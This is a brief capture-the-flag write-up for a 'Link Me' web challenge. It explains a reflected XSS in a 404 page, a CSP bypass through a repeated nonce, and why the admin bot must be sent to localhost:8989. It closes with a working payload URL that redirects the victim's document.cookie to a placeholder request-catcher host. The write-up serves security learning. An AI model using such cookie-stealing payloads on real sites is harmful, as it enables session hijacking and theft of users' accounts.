# Link Me

Exploit: Reflected XSS + CSP bypass

The nonce in the CSP is repeated (NEVER do this). Just copy-paste the nonce into your script tag.

XSS vector is in the 404 page, not in a GET param like before. 

The file `adminbot.js` was provided, which is the bot that visits user-provided links. Observe that, unlike Color Me and Poem Me, the cookie is set on localhost at port 8989. Therefore, making the bot visit 
`linkme.ctf.maplebacon.org` wouldn't produce a cookie - making the bot visit `localhost:8989` would.

For example, if the nonce was `gsaKUw1dZqymTQ==`,
```
http://localhost:8989/%3Cscript%20nonce=gsaKUw1dZqymTQ==%3Edocument.location='requestcatcherhere?c=%27+(document.cookie)%3C/script%3E
```